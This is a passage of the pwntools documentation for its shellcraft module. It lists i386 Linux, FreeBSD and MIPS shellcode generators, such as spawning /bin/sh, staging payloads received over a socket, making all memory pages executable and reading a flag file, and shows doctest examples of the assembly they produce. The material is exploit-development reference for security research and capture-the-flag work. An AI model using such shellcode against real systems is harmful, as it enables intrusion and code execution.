<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">loader_append</span><span class="p">(</span><span class="s1">&#39;a.out&#39;</span><span class="p">)</span>
</pre></div>
</div>
<p>The following doctest is commented out because it doesn&#8217;t work on Travis
for reasons I cannot diagnose.  However, it should work just fine :-)</p>
<blockquote>
<div># &gt;&gt;&gt; run_assembly(sc).recvline() == &#8216;Hello, i386!n&#8217;
# True</div></blockquote>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.mprotect_all">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">mprotect_all</code><span class="sig-paren">(</span><em>clear_ebx=True</em>, <em>fix_null=False</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/mprotect_all.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.mprotect_all" title="Permalink to this definition">¶</a></dt>
<dd><p>Calls mprotect(page, 4096, PROT_READ | PROT_WRITE | PROT_EXEC) for every page.</p>
<p>It takes around 0.3 seconds on my box, but your milage may vary.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>clear_ebx</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; If this is set to False, then the shellcode will assume that ebx has already been zeroed.</li>
<li><strong>fix_null</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; If this is set to True, then the NULL-page will also be mprotected at the cost of slightly larger shellcode</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.pidmax">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">pidmax</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/pidmax.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.pidmax" title="Permalink to this definition">¶</a></dt>
<dd><p>Retrieves the highest numbered PID on the system, according to
the sysctl kernel.pid_max.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.readfile">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">readfile</code><span class="sig-paren">(</span><em>path</em>, <em>dst='esi'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/readfile.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.readfile" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: [path, dst (imm/reg) = esi ]
Opens the specified file path and sends its content to the specified file descriptor.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.readn">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">readn</code><span class="sig-paren">(</span><em>fd</em>, <em>buf</em>, <em>nbytes</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/readn.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.readn" title="Permalink to this definition">¶</a></dt>
<dd><p>Reads exactly nbytes bytes from file descriptor fd into the buffer buf.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>fd</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; fd</li>
<li><strong>buf</strong> (<em>void</em>) &#8211; buf</li>
<li><strong>nbytes</strong> (<em>size_t</em>) &#8211; nbytes</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.recvsize">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">recvsize</code><span class="sig-paren">(</span><em>sock</em>, <em>reg='ecx'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/recvsize.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.recvsize" title="Permalink to this definition">¶</a></dt>
<dd><p>Recives 4 bytes size field
Useful in conjuncion with findpeer and stager
:param sock, the socket to read the payload from.:
:param reg, the place to put the size:
:type reg, the place to put the size: default ecx</p>
<p>Leaves socket in ebx</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.setregid">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">setregid</code><span class="sig-paren">(</span><em>gid='egid'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/setregid.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.setregid" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: [gid (imm/reg) = egid]
Sets the real and effective group id.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.setreuid">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">setreuid</code><span class="sig-paren">(</span><em>uid='euid'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/setreuid.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.setreuid" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: [uid (imm/reg) = euid]
Sets the real and effective user id.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.sh">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">sh</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/sh.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.sh" title="Permalink to this definition">¶</a></dt>
<dd><p>Execute a different process.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;echo Hello&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="go">&#39;Hello\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.socket">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">socket</code><span class="sig-paren">(</span><em>network='ipv4'</em>, <em>proto='tcp'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/socket.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.socket" title="Permalink to this definition">¶</a></dt>
<dd><p>Creates a new socket</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.socketcall">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">socketcall</code><span class="sig-paren">(</span><em>socketcall</em>, <em>socket</em>, <em>sockaddr</em>, <em>sockaddr_len</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/socketcall.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.socketcall" title="Permalink to this definition">¶</a></dt>
<dd><p>Invokes a socket call (e.g. socket, send, recv, shutdown)</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.stage">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">stage</code><span class="sig-paren">(</span><em>fd=0</em>, <em>length=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/stage.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.stage" title="Permalink to this definition">¶</a></dt>
<dd><p>Migrates shellcode to a new buffer.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>fd</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Integer file descriptor to recv data from.
Default is stdin (0).</li>
<li><strong>length</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Optional buffer length.  If None, the first pointer-width
of data received is the length.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">stage</span><span class="p">())</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">echo</span><span class="p">(</span><span class="s2">&quot;Hello</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">constants</span><span class="o">.</span><span class="n">STDOUT_FILENO</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;Hello\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.stager">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">stager</code><span class="sig-paren">(</span><em>sock</em>, <em>size</em>, <em>handle_error=False</em>, <em>tiny=False</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/stager.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.stager" title="Permalink to this definition">¶</a></dt>
<dd><p>Recives a fixed sized payload into a mmaped buffer
Useful in conjuncion with findpeer.
:param sock, the socket to read the payload from.:
:param size, the size of the payload:</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.syscall">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">syscall</code><span class="sig-paren">(</span><em>syscall=None</em>, <em>arg0=None</em>, <em>arg1=None</em>, <em>arg2=None</em>, <em>arg3=None</em>, <em>arg4=None</em>, <em>arg5=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/syscall.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.syscall" title="Permalink to this definition">¶</a></dt>
<dd><dl class="docutils">
<dt>Args: [syscall_number, *args]</dt>
<dd>Does a syscall</dd>
</dl>
<p>Any of the arguments can be expressions to be evaluated by <code class="xref py py-func docutils literal"><span class="pre">pwnlib.constants.eval()</span></code>.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="s1">&#39;SYS_execve&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;esp&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call execve(1, &#39;esp&#39;, 2, 0) */</span>
<span class="go">    push SYS_execve /* 0xb */</span>
<span class="go">    pop eax</span>
<span class="go">    push 1</span>
<span class="go">    pop ebx</span>
<span class="go">    mov ecx, esp</span>
<span class="go">    push 2</span>
<span class="go">    pop edx</span>
<span class="go">    xor esi, esi</span>
<span class="go">    int 0x80</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="s1">&#39;SYS_execve&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call execve(2, 1, 0, 0x14) */</span>
<span class="go">    push SYS_execve /* 0xb */</span>
<span class="go">    pop eax</span>
<span class="go">    push 2</span>
<span class="go">    pop ebx</span>
<span class="go">    push 1</span>
<span class="go">    pop ecx</span>
<span class="go">    push 0x14</span>
<span class="go">    pop esi</span>
<span class="go">    cdq /* edx=0 */</span>
<span class="go">    int 0x80</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call syscall() */</span>
<span class="go">    int 0x80</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="s1">&#39;ebx&#39;</span><span class="p">,</span> <span class="s1">&#39;ecx&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call syscall(&#39;eax&#39;, &#39;ebx&#39;, &#39;ecx&#39;) */</span>
<span class="go">    /* setregs noop */</span>
<span class="go">    int 0x80</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="s1">&#39;ebp&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call syscall(&#39;ebp&#39;, ?, ?, 1) */</span>
<span class="go">    mov eax, ebp</span>
<span class="go">    push 1</span>
<span class="go">    pop edx</span>
<span class="go">    int 0x80</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span>
<span class="gp">... </span>              <span class="s1">&#39;SYS_mmap2&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span>
<span class="gp">... </span>              <span class="s1">&#39;PROT_READ | PROT_WRITE | PROT_EXEC&#39;</span><span class="p">,</span>
<span class="gp">... </span>              <span class="s1">&#39;MAP_PRIVATE | MAP_ANONYMOUS&#39;</span><span class="p">,</span>
<span class="gp">... </span>              <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call mmap2(0, 0x1000, &#39;PROT_READ | PROT_WRITE | PROT_EXEC&#39;, &#39;MAP_PRIVATE | MAP_ANONYMOUS&#39;, -1, 0) */</span>
<span class="go">    xor eax, eax</span>
<span class="go">    mov al, 0xc0</span>
<span class="go">    xor ebp, ebp</span>
<span class="go">    xor ebx, ebx</span>
<span class="go">    xor ecx, ecx</span>
<span class="go">    mov ch, 0x1000 &gt;&gt; 8</span>
<span class="go">    push -1</span>
<span class="go">    pop edi</span>
<span class="go">    push (PROT_READ | PROT_WRITE | PROT_EXEC) /* 7 */</span>
<span class="go">    pop edx</span>
<span class="go">    push (MAP_PRIVATE | MAP_ANONYMOUS) /* 0x22 */</span>
<span class="go">    pop esi</span>
<span class="go">    int 0x80</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;/home/pwn/flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* open(file=&#39;/home/pwn/flag&#39;, oflag=0, mode=0) */</span>
<span class="go">    /* push &#39;/home/pwn/flag\x00&#39; */</span>
<span class="go">    push 0x1010101</span>
<span class="go">    xor dword ptr [esp], 0x1016660</span>
<span class="go">    push 0x6c662f6e</span>
<span class="go">    push 0x77702f65</span>
<span class="go">    push 0x6d6f682f</span>
<span class="go">    mov ebx, esp</span>
<span class="go">    xor ecx, ecx</span>
<span class="go">    xor edx, edx</span>
<span class="go">    /* call open() */</span>
<span class="go">    push SYS_open /* 5 */</span>
<span class="go">    pop eax</span>
<span class="go">    int 0x80</span>
</pre></div>
</div>
</dd></dl>

</div>
<div class="section" id="module-pwnlib.shellcraft.i386.freebsd">
<span id="pwnlib-shellcraft-i386-freebsd"></span><h6><a class="reference internal" href="#module-pwnlib.shellcraft.i386.freebsd" title="pwnlib.shellcraft.i386.freebsd"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.i386.freebsd</span></code></a><a class="headerlink" href="#module-pwnlib.shellcraft.i386.freebsd" title="Permalink to this headline">¶</a></h6>
<p>Shellcraft module containing Intel i386 shellcodes for FreeBSD.</p>
<dl class="function">
<dt id="pwnlib.shellcraft.i386.freebsd.acceptloop_ipv4">
<code class="descclassname">pwnlib.shellcraft.i386.freebsd.</code><code class="descname">acceptloop_ipv4</code><span class="sig-paren">(</span><em>port</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/freebsd/acceptloop_ipv4.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.freebsd.acceptloop_ipv4" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: port
Waits for a connection.  Leaves socket in EBP.
ipv4 only</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.freebsd.i386_to_amd64">
<code class="descclassname">pwnlib.shellcraft.i386.freebsd.</code><code class="descname">i386_to_amd64</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/freebsd/i386_to_amd64.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.freebsd.i386_to_amd64" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns code to switch from i386 to amd64 mode.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.freebsd.sh">
<code class="descclassname">pwnlib.shellcraft.i386.freebsd.</code><code class="descname">sh</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/freebsd/sh.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.freebsd.sh" title="Permalink to this definition">¶</a></dt>
<dd><p>Execute /bin/sh</p>
</dd></dl>

</div>
</div>
<span id="document-shellcraft/mips"></span><div class="section" id="pwnlib-shellcraft-mips-shellcode-for-mips">
<h5><a class="reference internal" href="#module-pwnlib.shellcraft.mips" title="pwnlib.shellcraft.mips"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.mips</span></code></a> &#8212; Shellcode for MIPS<a class="headerlink" href="#pwnlib-shellcraft-mips-shellcode-for-mips" title="Permalink to this headline">¶</a></h5>
<div class="section" id="module-pwnlib.shellcraft.mips">
<span id="pwnlib-shellcraft-mips"></span><h6><a class="reference internal" href="#module-pwnlib.shellcraft.mips" title="pwnlib.shellcraft.mips"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.mips</span></code></a><a class="headerlink" href="#module-pwnlib.shellcraft.mips" title="Permalink to this headline">¶</a></h6>
<p>Shellcraft module containing generic MIPS shellcodes.</p>
<dl class="function">
<dt id="pwnlib.shellcraft.mips.mov">
<code class="descclassname">pwnlib.shellcraft.mips.</code><code class="descname">mov</code><span class="sig-paren">(</span><em>dst</em>, <em>src</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/mov.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.mov" title="Permalink to this definition">¶</a></dt>
<dd><p>Move src into dst without newlines and null bytes.</p>
<p>Register $t8 and $t9 are not guarenteed to be preserved.</p>
<p>If src is a string that is not a register, then it will locally set
<cite>context.arch</cite> to <cite>&#8216;mips&#8217;</cite> and use <code class="xref py py-func docutils literal"><span class="pre">pwnlib.constants.eval()</span></code> to evaluate the
string. Note that this means that this shellcode can change behavior depending
on the value of <cite>context.os</cite>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>dst</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The destination register.</li>
<li><strong>src</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Either the input register, or an immediate value.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;$t0&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    slti $t0, $zero, 0xFFFF /* $t0 = 0 */</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;$t2&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    xor $t2, $t2, $t2  /* $t2 = 0 */</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;$t0&#39;</span><span class="p">,</span> <span class="mh">0xcafebabe</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    li $t0, 0xcafebabe</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;$t2&#39;</span><span class="p">,</span> <span class="mh">0xcafebabe</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    li $t9, 0xcafebabe</span>
<span class="go">    add $t2, $t9, $zero</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;$s0&#39;</span><span class="p">,</span> <span class="mh">0xca0000be</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    li $t9, ~0xca0000be</span>
<span class="go">    not $s0, $t9</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;$s0&#39;</span><span class="p">,</span> <span class="mh">0xca0000ff</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    li $t9, 0x1010101 ^ 0xca0000ff</span>
<span class="go">    li $s0, 0x1010101</span>
<span class="go">    xor $s0, $t9, $s0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;$t9&#39;</span><span class="p">,</span> <span class="mh">0xca0000be</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    li $t9, ~0xca0000be</span>
<span class="go">    not $t9, $t9</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;$t2&#39;</span><span class="p">,</span> <span class="mh">0xca0000be</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    li $t9, ~0xca0000be</span>
<span class="go">    not $t9, $t9</span>
<span class="go">    add $t2, $t9, $0 /* mov $t2, $t9 */</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;$t2&#39;</span><span class="p">,</span> <span class="mh">0xca0000ff</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    li $t8, 0x1010101 ^ 0xca0000ff</span>
<span class="go">    li $t9, 0x1010101</span>
<span class="go">    xor $t9, $t8, $t9</span>
<span class="go">    add $t2, $t9, $0 /* mov $t2, $t9 */</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;$a0&#39;</span><span class="p">,</span> <span class="s1">&#39;$t2&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    add $a0, $t2, $0 /* mov $a0, $t2 */</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;$a0&#39;</span><span class="p">,</span> <span class="s1">&#39;$t8&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    sw $t8, -4($sp) /* mov $a0, $t8 */</span>
<span class="go">    lw $a0, -4($sp)</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.nop">
<code class="descclassname">pwnlib.shellcraft.mips.</code><code class="descname">nop</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/nop.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.nop" title="Permalink to this definition">¶</a></dt>
<dd><p>MIPS nop instruction.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.push">
